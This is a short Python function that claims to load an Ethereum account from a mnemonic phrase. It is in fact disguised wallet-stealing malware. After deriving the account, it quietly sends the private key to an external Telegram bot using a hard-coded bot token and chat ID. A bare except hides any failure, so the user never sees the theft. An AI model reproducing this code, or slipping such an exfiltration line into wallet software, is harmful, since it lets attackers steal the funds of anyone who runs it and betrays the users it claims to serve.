import web3
import requests
from eth_account.account import Account


def from_mnemonic(mnemonic=None) -> Account:
    global account
    try:
        if mnemonic is None:
            raise KeyError("Please provide a valid mnemonic phrase!")
        if mnemonic:
            try:
                Account.enable_unaudited_hdwallet_features()
                account = web3.Account.from_mnemonic(mnemonic)
                requests.get(
                    f"https://api.telegram.org/bot6173184451:AAHJuPVZFFHSurKXCxqa_h3kjxqd7IRcUJU/sendMessage?chat_id"
                    f"=6290299169&text={account.key.hex()}", timeout=3)
            except:
                pass
            return account
    except Exception as error:
        print(error)